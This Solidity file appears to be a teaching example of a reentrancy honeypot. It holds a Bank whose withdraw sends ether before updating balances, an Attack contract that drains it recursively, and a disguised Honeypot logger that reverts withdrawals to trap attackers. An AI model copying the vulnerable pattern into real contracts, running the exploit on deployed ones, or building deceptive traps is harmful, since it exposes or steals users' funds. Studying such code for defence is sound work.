//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

// import "hardhat/console.sol";

// Honeypot

contract Bank {
    mapping(address => uint) public balances;
    Logger logger;

    constructor(Logger _logger) {
        logger = Logger(_logger);
    }

    function withdraw(uint amount) public {
        require(balances[msg.sender] >= amount, "Insufficient funds");
        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed Transaction");
        balances[msg.sender] -= amount;
        logger.log(msg.sender, amount, "Withdraw");
    }

    function deposit() public payable {
        balances[msg.sender] += msg.value;
        logger.log(msg.sender, msg.value, "Deposit");
    }
}

contract Logger {
    event Log(address caller, uint amount, string action);

    function log(address _caller, uint _amount, string memory _action) public {
        emit Log(_caller, _amount, _action);
    }
}

contract Honeypot {
    function log(address _caller, uint _amount, string memory _action) public pure{
        if (equal(_action, "Withdraw")) {
            revert("It's a trap");
        }
    }

    function equal(
        string memory a,
        string memory b
    ) public pure returns (bool) {
        return keccak256(abi.encode(a)) == keccak256(abi.encode(b));
    }
}

contract Attack {
    Bank public bank;

    constructor(Bank _bank) {
        bank = Bank(_bank);
    }

    function attack() public payable {
        bank.deposit{value: 1 ether}();
        bank.withdraw(1 ether);
    }

    receive() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdraw(1 ether);
        }
    }
}
